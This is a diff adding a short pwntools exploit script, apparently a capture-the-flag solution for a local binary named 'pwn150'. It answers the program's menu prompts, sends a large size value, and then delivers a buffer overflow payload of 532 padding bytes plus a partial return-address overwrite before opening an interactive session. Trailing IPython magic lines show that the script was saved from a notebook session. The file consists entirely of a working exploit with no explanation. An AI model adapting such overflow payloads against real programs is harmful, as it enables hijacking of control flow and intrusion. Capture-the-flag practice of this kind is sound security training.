@@ -1,0 +1,15 @@
+# coding: utf-8
+from pwn import *
+p = process('./pwn150')
+p.recv()
+p.sendline('A')
+p.recv()
+p.sendline('Y')
+p.recv()
+p.sendline('65536')
+p.recv()
+p.sendline('A'*532+chr(0xd8)+chr(0x04)+chr(0x01))
+p.interactive()
+get_ipython().magic(u'ls ')
+get_ipython().magic(u'save solve.py ~1/')
+get_ipython().magic(u'save solve.py ~0/')
